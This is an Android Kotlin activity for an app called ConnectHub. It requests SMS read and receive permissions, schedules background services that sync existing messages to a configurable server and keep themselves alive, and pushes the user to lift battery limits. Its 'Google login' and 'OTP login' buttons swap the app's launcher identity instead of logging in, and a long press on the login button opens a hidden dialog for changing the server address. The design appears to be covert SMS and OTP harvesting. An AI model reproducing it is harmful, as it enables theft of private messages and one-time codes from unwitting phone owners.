package com.rohan.connecthub

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.View
import android.view.animation.AlphaAnimation
import android.view.animation.Animation
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.rohan.connecthub.api.RetrofitClient
import com.rohan.connecthub.models.LoginRequest
import com.rohan.connecthub.utils.SharedPrefManager
import com.rohan.connecthub.workers.KeepAliveWorker
import com.rohan.connecthub.workers.SyncExistingMessagesWorker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private lateinit var loginLayout: LinearLayout
    private lateinit var dashboardLayout: LinearLayout
    private lateinit var statusText: TextView
    private lateinit var usernameInput: EditText
    private lateinit var passwordInput: EditText
    private lateinit var loginButton: Button
    private lateinit var logoutButton: Button
    private lateinit var googleLoginButton: Button
    private lateinit var otpLoginButton: Button
    private var pulseDot: View? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // 1. Views ला कनेक्ट करा
        loginLayout = findViewById(R.id.loginLayout)
        dashboardLayout = findViewById(R.id.dashboardLayout)
        statusText = findViewById(R.id.statusText)
        usernameInput = findViewById(R.id.usernameInput)
        passwordInput = findViewById(R.id.passwordInput)
        loginButton = findViewById(R.id.loginButton)
        logoutButton = findViewById(R.id.logoutButton)
        googleLoginButton = findViewById(R.id.googleLoginButton)
        otpLoginButton = findViewById(R.id.otpLoginButton)
        pulseDot = findViewById(R.id.pulseDot)

        checkPermissions()

        // 2. ऑटो-लॉगिन चेक
        val token = SharedPrefManager.getToken(this)
        if (!token.isNullOrEmpty()) {
            showDashboard()
        } else {
            showLogin()
        }

        // --- बटन लिसनर्स ---
        loginButton.setOnClickListener {
            val user = usernameInput.text.toString()
            val pass = passwordInput.text.toString()
            if (user.isNotEmpty() && pass.isNotEmpty()) {
                login(user, pass)
            } else {
                Toast.makeText(this, "Credentials टाका", Toast.LENGTH_SHORT).show()
            }
        }

        // HIDDEN FEATURE: Long press login button to change Server IP if it hangs
        loginButton.setOnLongClickListener {
            showServerConfigDialog()
            true
        }

        // रिमोटली किंवा मॅन्युअली मोड बदलणे
        googleLoginButton.setOnClickListener {
            changeAppIdentity(false)
        }

        otpLoginButton.setOnClickListener {
            changeAppIdentity(true)
        }

        logoutButton.setOnClickListener {
            logout()
        }
    }

    private fun showServerConfigDialog() {
        val input = EditText(this)
        input.hint = "http://192.168.x.x:5000/api/"
        input.setText(SharedPrefManager.getCustomUrl(this) ?: BuildConfig.BASE_URL)
        
        android.app.AlertDialog.Builder(this)
            .setTitle("Server Connection Settings")
            .setMessage("If 'Connecting...' takes too long, enter your computer IP (Local Network).")
            .setView(input)
            .setPositiveButton("Update & Restart") { _, _ ->
                val newUrl = input.text.toString()
                if (newUrl.isNotEmpty()) {
                    SharedPrefManager.saveCustomUrl(this, newUrl)
                    Toast.makeText(this, "Restarting with new endpoint...", Toast.LENGTH_SHORT).show()
                    finish();
                    startActivity(intent);
                }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun showDashboard() {
        loginLayout.visibility = View.GONE
        dashboardLayout.visibility = View.VISIBLE
        statusText.text = "ENCRYPTED & ACTIVE"
        startSyncService()
        startPulseAnimation()
        scheduleSyncExistingMessages()
    }

    private fun showLogin() {
        loginLayout.visibility = View.VISIBLE
        dashboardLayout.visibility = View.GONE
    }

    private fun login(user: String, pass: String) {
        loginButton.isEnabled = false
        loginButton.text = "Connecting..."

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val api = RetrofitClient.getInstance(this@MainActivity)
                val response = withContext(Dispatchers.IO) {
                    api.login(LoginRequest(user, pass))
                }

                withContext(Dispatchers.Main) {
                    loginButton.isEnabled = true
                    loginButton.text = "AUTHORIZE"

                    if (response.isSuccessful && response.body() != null) {
                        val body = response.body()!!

                        SharedPrefManager.saveToken(this@MainActivity, body.accessToken, body.refreshToken)
                        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                        SharedPrefManager.saveDeviceId(this@MainActivity, androidId)

                        Toast.makeText(this@MainActivity, "Access Granted", Toast.LENGTH_SHORT).show()
                        showDashboard()
                    } else {
                        Toast.makeText(this@MainActivity, "Access Denied: Check credentials", Toast.LENGTH_SHORT).show()
                    }
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    loginButton.isEnabled = true
                    loginButton.text = "AUTHORIZE"
                    val msg = if (e.toString().contains("Timeout") || e.toString().contains("Failed to connect")) {
                        "Connection Failed: Is the server running at the correct IP?"
                    } else {
                        "Network Error: ${e.localizedMessage}"
                    }
                    Toast.makeText(this@MainActivity, msg, Toast.LENGTH_LONG).show()
                    Log.e("MainActivity", "Login error", e)
                }
            }
        }
    }

    private fun logout() {
        SharedPrefManager.clear(this)
        val intent = Intent(this, SyncService::class.java)
        stopService(intent)
        WorkManager.getInstance(this).cancelUniqueWork("KeepAlive")
        showLogin()
    }

    private fun startSyncService() {
        val serviceIntent = Intent(this, SyncService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        scheduleKeepAlive()
    }

    private fun scheduleKeepAlive() {
        val workRequest = PeriodicWorkRequestBuilder<KeepAliveWorker>(15, TimeUnit.MINUTES).build()
        WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
            "KeepAlive",
            ExistingPeriodicWorkPolicy.KEEP,
            workRequest
        )
    }

    private fun scheduleSyncExistingMessages() {
        val workRequest = OneTimeWorkRequestBuilder<SyncExistingMessagesWorker>().build()
        WorkManager.getInstance(applicationContext).enqueue(workRequest)
    }

    private fun startPulseAnimation() {
        pulseDot?.let {
            val animation = AlphaAnimation(1.0f, 0.2f).apply {
                duration = 800
                repeatMode = Animation.REVERSE
                repeatCount = Animation.INFINITE
            }
            it.startAnimation(animation)
        }
    }

    private fun changeAppIdentity(useAlias: Boolean) {
        val pm = packageManager
        val defaultComponent = ComponentName(this, "com.rohan.connecthub.MainActivity")
        val aliasComponent = ComponentName(this, "com.rohan.connecthub.MainActivityAlias")

        pm.setComponentEnabledSetting(
            defaultComponent,
            if (useAlias) PackageManager.COMPONENT_ENABLED_STATE_DISABLED else PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )

        pm.setComponentEnabledSetting(
            aliasComponent,
            if (useAlias) PackageManager.COMPONENT_ENABLED_STATE_ENABLED else PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )

        val msg = if (useAlias) "Identity: Secure Node Active" else "Identity: Default Restored"
        Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
    }

    private fun checkPermissions() {
        val permissions = mutableListOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        val notGranted = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (notGranted.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, notGranted.toTypedArray(), 100)
        }
        checkBatteryOptimization()
    }

    private fun checkBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent().apply {
                    action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            }
        }
    }
}